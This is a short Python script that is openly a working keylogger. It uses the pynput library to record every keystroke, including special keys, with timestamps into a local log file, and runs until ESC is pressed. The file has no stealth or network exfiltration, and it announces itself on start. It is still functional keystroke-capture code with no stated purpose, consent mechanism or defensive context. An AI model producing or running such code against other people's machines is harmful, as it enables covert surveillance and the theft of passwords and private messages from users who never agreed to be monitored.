from pynput.keyboard import Key, Listener
import os
from datetime import datetime

log_dir = "../logs"
log_file = os.path.join(log_dir, "key_log.txt")

if not os.path.exists(log_dir):
    os.makedirs(log_dir)

def log_key(text):
    timestamp = datetime.now().strftime("%H:%M:%S")
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {text}\n")

def on_press(key):
    try:
        log_key(f"Key Pressed: {key.char}")
    except AttributeError:
        if key == Key.space:
            log_key("Key Pressed: [SPACE]")
        elif key == Key.enter:
            log_key("Key Pressed: [ENTER]")
        elif key == Key.backspace:
            log_key("Key Pressed: [BACKSPACE - Deleted]")
        elif key == Key.tab:
            log_key("Key Pressed: [TAB]")
        elif key == Key.caps_lock:
            log_key("Key Pressed: [CAPS LOCK]")
        elif key == Key.shift or key == Key.shift_r:
            log_key("Key Pressed: [SHIFT]")
        elif key == Key.ctrl or key == Key.ctrl_r:
            log_key("Key Pressed: [CTRL]")
        elif key == Key.alt or key == Key.alt_r:
            log_key("Key Pressed: [ALT]")
        else:
            log_key(f"Key Pressed: [{key}]")

def on_release(key):
    if key == Key.esc:
        log_key("=== KEYLOGGER STOPPED ===")
        print("Keylogger stopped!")
        return False

log_key("=== KEYLOGGER STARTED ===")
print("Keylogger started... Press ESC to stop.")
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
